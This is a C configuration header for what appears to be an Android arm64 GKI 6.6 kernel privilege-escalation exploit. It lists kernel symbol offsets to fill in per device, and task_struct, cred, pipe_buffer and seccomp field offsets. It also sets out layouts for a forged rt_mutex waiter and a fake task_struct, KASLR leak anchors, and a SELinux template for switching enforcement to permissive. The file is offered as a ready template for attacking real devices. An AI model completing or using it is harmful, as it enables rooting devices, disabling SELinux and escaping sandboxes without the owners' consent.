/* target.h — device-specific parameters template
 *
 * This file contains TWO kinds of constants:
 *   1. DEVICE-SPECIFIC (marked "◆ FILL IN"): kernel symbol offsets, memory
 *      layout, build fingerprint, per-CPU runtime addresses, SELinux golden
 *      template. These MUST be filled with values for YOUR device/kernel.
 *      Placeholder 0xDEADBEEF... is used so the file compiles as-is but
 *      WILL NOT RUN until you replace them.
 *   2. GKI INVARIANTS (no marker): struct field offsets that are stable
 *      across all arm64 + Android 6.6 GKI kernels (task_struct layout,
 *      rt_mutex_waiter, cred, pipe_buffer, file_operations, etc.).
 *      These are kept as real values — usually no edit needed.
 *
 * How to obtain device-specific values: see README "字段说明" appendix.
 */
#ifndef TARGET_H
#define TARGET_H

/* ═══════════════════════════════════════════════════════════════════════════
 * Build identity — ◆ FILL IN
 *   Arbitrary labels for logging/identification on your device.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define BUILD_VARIANT_LABEL "DEVICE_CODENAME_SOC"
#define BUILD_FINGERPRINT "manufacturer/device/device:15/buildid/user/release-keys"

/* ═══════════════════════════════════════════════════════════════════════════
 * Memory layout — ◆ FILL IN
 *   KIMAGE_TEXT_BASE: kernel text base (no KASLR slide).
 *     arm64 VA39 typical: 0xffffffc080000000; VA48: 0xffff800080000000.
 *   P0_PAGE_OFFSET / DIRECT_MAP_*: page-offset/direct-map VA range.
 *   P0_PHYS_OFFSET / P0_KERNEL_PHYS_LOAD: physical RAM start / kernel load.
 *   VMEMMAP_START: vmemmap VA (struct-page array).
 *   Read from IKCONFIG / kallsyms / /proc/iomem on the device.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define KIMAGE_TEXT_BASE             0xffffffc080000000ULL
#define P0_PAGE_OFFSET               0xffffff8000000000ULL
#define P0_PHYS_OFFSET               0x40000000ULL
#define P0_KERNEL_PHYS_LOAD          0x40000000ULL
#define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
#define DIRECT_MAP_BASE              0xffffff8000000000ULL
#define DIRECT_MAP_END               0xffffff9000000000ULL
#define VMEMMAP_START                0xfffffffe00000000ULL

#define PSELECT_WAITER_WORD_SHIFT    0   /* ◆ FILL IN: derived from pselect fdset layout */

/* ═══════════════════════════════════════════════════════════════════════════
 * ASHMEM — ◆ FILL IN
 *   Offsets of ashmem file_operations members + ashmem_misc, relative to
 *   KIMAGE_TEXT_BASE. Resolve via kallsyms_lookup_name("ashmem_fops") etc.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define ASHMEM_IOCTL_OFF             0xDEADBEEF00000001ULL
#define ASHMEM_COMPAT_IOCTL_OFF      0xDEADBEEF00000002ULL
#define ASHMEM_MMAP_OFF              0xDEADBEEF00000003ULL
#define ASHMEM_OPEN_OFF              0xDEADBEEF00000004ULL
#define ASHMEM_RELEASE_OFF           0xDEADBEEF00000005ULL
#define ASHMEM_SHOW_FDINFO_OFF       0xDEADBEEF00000006ULL
#define ASHMEM_FOPS_OFF              0xDEADBEEF00000007ULL
#define ASHMEM_MISC_OFF              0xDEADBEEF00000008ULL
#define ASHMEM_MISC_FOPS_OFF         0xDEADBEEF00000009ULL  /* ashmem_misc + 0x10 */

/* ═══════════════════════════════════════════════════════════════════════════
 * CONFIGFS / PIPE / VFS — ◆ FILL IN
 *   configfs read/write_iter, noop_llseek, copy_splice_read, anon_pipe_buf_ops,
 *   kmalloc_caches. Resolve via kallsyms.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define CONFIGFS_READ_ITER_OFF       0xDEADBEEF00000010ULL
#define CONFIGFS_WRITE_ITER_OFF      0xDEADBEEF00000011ULL
#define CONFIGFS_BIN_READ_ITER_OFF   0xDEADBEEF00000012ULL
#define CONFIGFS_BIN_WRITE_ITER_OFF  0xDEADBEEF00000013ULL
#define NOOP_LLSEEK_OFF              0xDEADBEEF00000014ULL
#define COPY_SPLICE_READ_OFF         0xDEADBEEF00000015ULL
#define ANON_PIPE_BUF_OPS_OFF        0xDEADBEEF00000016ULL
#define KMALLOC_CACHES_OFF           0xDEADBEEF00000017ULL

/* ═══════════════════════════════════════════════════════════════════════════
 * SELinux — ◆ FILL IN
 *   SELINUX_ENFORCING_OFF is the build-match anchor: it identifies the exact
 *   kernel build. selinux_blob_sizes + security_hook_heads via kallsyms.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define SELINUX_ENFORCING_OFF        0xDEADBEEF00000020ULL
#define SELINUX_BLOB_SIZES_OFF       0xDEADBEEF00000021ULL
#define SECURITY_HOOK_HEADS_OFF      0xDEADBEEF00000022ULL

/* ═══════════════════════════════════════════════════════════════════════════
 * Core kernel symbols — ◆ FILL IN
 *   init_task, init_cred, entry_task, __per_cpu_offset, root_task_group.
 *   ENTRY_TASK_PERCPU_OFF: __entry_task offset within percpu section.
 *   Resolve via kallsyms_lookup_name.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define INIT_TASK_OFF                0xDEADBEEF00000030ULL
#define INIT_CRED_OFF                0xDEADBEEF00000031ULL
#define ENTRY_TASK_OFF               0xDEADBEEF00000032ULL
#define PER_CPU_OFFSET_OFF           0xDEADBEEF00000033ULL
#define ROOT_TASK_GROUP_OFF          0xDEADBEEF00000034ULL
#define SELINUX_STATE_OFF            SELINUX_ENFORCING_OFF
#define ENTRY_TASK_PERCPU_OFF        0xDEADBEEF00000035ULL

/* ═══════════════════════════════════════════════════════════════════════════
 * Per-CPU runtime layout — ◆ FILL IN
 *   These are NOT image offsets; they are RUNTIME per-CPU chunk addresses
 *   (post-KASLR). Dumped per-boot. TARGET_PCPU_UNIT_SIZE depends on CPU count.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define TARGET_PCPU_BASE_ADDR    0xDEADBEEFEA2F8000ULL
#define TARGET_PCPU_UNIT_SIZE    0x1f000UL

/* ═══════════════════════════════════════════════════════════════════════════
 * SLIDE (KASLR leak anchors) — ◆ FILL IN
 *   Kernel data symbols used to leak KASLR slide via physrw reads.
 *   Resolve via kallsyms: nfulnl_logger, nf_loggers, random/boot_id data,
 *   sysctl_bootid.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define SLIDE_NFULNL_LOGGER_OFF          0xDEADBEEF00000040ULL
#define SLIDE_LOGGERS_0_1_OFF            0xDEADBEEF00000041ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF    0xDEADBEEF00000042ULL
#define SLIDE_INIT_TASK_OFF              INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF        ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF          0xDEADBEEF00000043ULL

/* ═══════════════════════════════════════════════════════════════════════════
 * Computed kernel addresses (image → runtime) — derived, no edit needed
 * ═══════════════════════════════════════════════════════════════════════════ */
#define ASHMEM_IOCTL              (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL       (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP               (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN               (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE            (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO        (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define ASHMEM_FOPS               (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_MISC               (KIMAGE_TEXT_BASE + ASHMEM_MISC_OFF)
#define ASHMEM_MISC_FOPS          (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define CONFIGFS_READ_ITER        (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_WRITE_ITER       (KIMAGE_TEXT_BASE + CONFIGFS_WRITE_ITER_OFF)
#define CONFIGFS_BIN_READ_ITER    (KIMAGE_TEXT_BASE + CONFIGFS_BIN_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER   (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define NOOP_LLSEEK               (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define COPY_SPLICE_READ          (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define ANON_PIPE_BUF_OPS         (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define KMALLOC_CACHES            (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define INIT_TASK                 (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_CRED                 (KIMAGE_TEXT_BASE + INIT_CRED_OFF)
#define ENTRY_TASK                (KIMAGE_TEXT_BASE + ENTRY_TASK_OFF)
#define PER_CPU_OFFSET            (KIMAGE_TEXT_BASE + PER_CPU_OFFSET_OFF)
#define ROOT_TASK_GROUP           (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING         (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_BLOB_SIZES        (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SECURITY_HOOK_HEADS       (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)

#define SLIDE_NFULNL_LOGGER_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE         (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE           (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE     (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE       (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ═══════════════════════════════════════════════════════════════════════════
 * Page layout within kernel page (universal across all targets)
 * ═══════════════════════════════════════════════════════════════════════════ */
#define LOCK_OFF       0x1350
#define W0_OFF         0x2220
#define FOPS_OFF       0x1000
#define SCRATCH_OFF    0x3000
#define RIGHT_OFF      0x4440
#define LEFT_OFF       0x5550
#define FAKE_TASK_OFF  0x3200
#define CRED_COPY_OFF  0x6660

/* ═══════════════════════════════════════════════════════════════════════════
 * rt_mutex_waiter (universal ARM64 struct layout invariant)
 *
 * Family B layout: pi_tree_entry @ 0x28, task @ 0x50
 * (NOT family A: pi_tree_entry @ 0x18, task @ 0x30 — duchamp/dali)
 * ═══════════════════════════════════════════════════════════════════════════ */
#define WAITER_LOCAL_OFF            0x80   /* waiter on stack */
#define WAITER_TREE_ENTRY_OFF       0x00
#define WAITER_PI_TREE_ENTRY_OFF    0x28   /* family B; family A is 0x18 */
#define WAITER_TASK_OFF             0x50
#define WAITER_LOCK_OFF             0x58
#define WAITER_WAKE_STATE_OFF       0x60
#define WAITER_PRIO_OFF             0x18
#define WAITER_DEADLINE_OFF         0x20
#define WAITER_WW_CTX_OFF           0x68

/* Forged waiter offsets (pselect fdset → waiter struct mapping). */
#define FAKE_WAITER_TREE_PRIO_OFF        0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF    0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF    0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF     0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF             0x50
#define FAKE_WAITER_LOCK_OFF             0x58
#define FAKE_WAITER_WAKE_STATE_OFF       0x60
#define FAKE_WAITER_WW_CTX_OFF           0x68

/* ═══════════════════════════════════════════════════════════════════════════
 * Fake task_struct (matches task_struct below)
 * ═══════════════════════════════════════════════════════════════════════════ */
#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x84
#define FAKE_TASK_NORMAL_PRIO_OFF    0x8c
#define FAKE_TASK_TASK_GROUP_OFF     0x348
#define FAKE_TASK_PI_LOCK_OFF        0x90c
#define FAKE_TASK_PI_WAITERS_OFF     0x920
#define FAKE_TASK_PI_TOP_TASK_OFF    0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x938
#define FAKE_TASK_UCLAMP_REQ_OFF     0x350
#define FAKE_TASK_UCLAMP_OFF         0x358

/* ═══════════════════════════════════════════════════════════════════════════
 * configfs buffer (CFG) offsets — universal
 * ═══════════════════════════════════════════════════════════════════════════ */
#define CFG_PAGE_OFF              16
#define CFG_NEEDS_READ_FILL_OFF   80
#define CFG_BIN_BUFFER_OFF        88
#define CFG_BIN_BUFFER_SIZE_OFF   96
#define CFG_CB_MAX_SIZE_OFF       100

/* ═══════════════════════════════════════════════════════════════════════════
 * task_struct — GKI 6.6 field offsets (verify if kernel build differs)
 * ═══════════════════════════════════════════════════════════════════════════ */
#define MM_OWNER_OFF                 1032     /* 0x408, GKI 6.6 std */
#define TASK_PID_OFF                 0x618
#define TASK_TGID_OFF                0x61c
#define TASK_REAL_PARENT_OFF         0x628
#define TASK_ATOMIC_FLAGS_OFF        0x5d8
#define TASK_REAL_CRED_OFF           0x818
#define TASK_CRED_OFF                0x820
#define TASK_COMM_OFF                0x830
#define TASK_TASKS_OFF               0x550
#define TASK_THREAD_GROUP_OFF        0x6e0   /* for task list walk */
#define TASK_PI_LOCK_OFF             0x90c   /* matches FAKE_TASK_PI_LOCK_OFF */
#define TASK_PI_WAITERS_OFF          0x920
#define TASK_PI_TOP_TASK_OFF         0x930
#define TASK_PI_BLOCKED_ON_OFF       0x938
#define TASK_THREAD_INFO_FLAGS_OFF   0x00
#define TASK_SECCOMP_OFF             0x8e8

/* ═══════════════════════════════════════════════════════════════════════════
 * cred — GKI 6.6 field offsets
 * ═══════════════════════════════════════════════════════════════════════════ */
#define CRED_UID_OFF              8
#define CRED_SECUREBITS_OFF       40
#define CRED_CAPS_OFF             48
#define CRED_SECURITY_OFF         128
#define SELINUX_CRED_BLOB_OFF     0
#define SELINUX_CRED_OSID_OFF     0
#define SELINUX_CRED_SID_OFF      4

/* ═══════════════════════════════════════════════════════════════════════════
 * SELinux golden template — ◆ FILL IN
 *   First 16 bytes of selinux_state booleans (cross-reboot-stable per device).
 *   byte0=enforcing flag: callers write 0x00 (permissive) here.
 *   Dump from your device's selinux_state via KPM or kernel debugger.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define TARGET_SELINUX_GOLDEN                                  \
  { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,           \
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }

/* ═══════════════════════════════════════════════════════════════════════════
 * seccomp — universal across all GKI 6.6 targets
 * ═══════════════════════════════════════════════════════════════════════════ */
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* ═══════════════════════════════════════════════════════════════════════════
 * struct page / slab — GKI invariant
 * ═══════════════════════════════════════════════════════════════════════════ */
#define STRUCT_PAGE_SIZE               0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF  0x08
#define STRUCT_SLAB_CACHE_OFF          0x08
#define STRUCT_PAGE_TYPE_OFF           0x30

/* ═══════════════════════════════════════════════════════════════════════════
 * pipe_buffer — universal across all targets
 * ═══════════════════════════════════════════════════════════════════════════ */
#define PIPE_BUFFER_SIZE          0x28
#define PIPE_BUFFER_SLOTS         32
#define PIPE_BUF_FLAG_CAN_MERGE   0x10

/* ═══════════════════════════════════════════════════════════════════════════
 * pipe inode info — ◆ FILL IN (kernel-build-dependent)
 *   Stable within same GKI family but verify on your kernel build.
 * ═══════════════════════════════════════════════════════════════════════════ */
#define PIPE_INODE_INFO_STRUCT_SIZE    0xb8
#define PIPE_INODE_INFO_SIZE           0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF                  0x60
#define PIPE_TAIL_OFF                  0x64
#define PIPE_MAX_USAGE_OFF             0x68
#define PIPE_RING_SIZE_OFF             0x6c
#define PIPE_NR_ACCOUNTED_OFF          0x70
#define PIPE_READERS_OFF               0x74
#define PIPE_WRITERS_OFF               0x78
#define PIPE_FILES_OFF                 0x7c
#define PIPE_TMP_PAGE_OFF              0x90
#define PIPE_BUFS_OFF                  0xa8
#define PIPE_USER_OFF                  0xb0

/* ═══════════════════════════════════════════════════════════════════════════
 * struct file_operations — GKI invariant
 * ═══════════════════════════════════════════════════════════════════════════ */
#define FOPS_OWNER_OFF          0x00
#define FOPS_LLSEEK_OFF         0x08
#define FOPS_READ_OFF           0x10
#define FOPS_WRITE_OFF          0x18
#define FOPS_READ_ITER_OFF      0x20
#define FOPS_WRITE_ITER_OFF     0x28
#define FOPS_IOCTL_OFF          0x48
#define FOPS_COMPAT_IOCTL_OFF   0x50
#define FOPS_MMAP_OFF           0x58
#define FOPS_OPEN_OFF           0x68
#define FOPS_RELEASE_OFF        0x78
#define FOPS_SPLICE_READ_OFF    0xb8
#define FOPS_SHOW_FDINFO_OFF    0xd8

#endif /* TARGET_H */
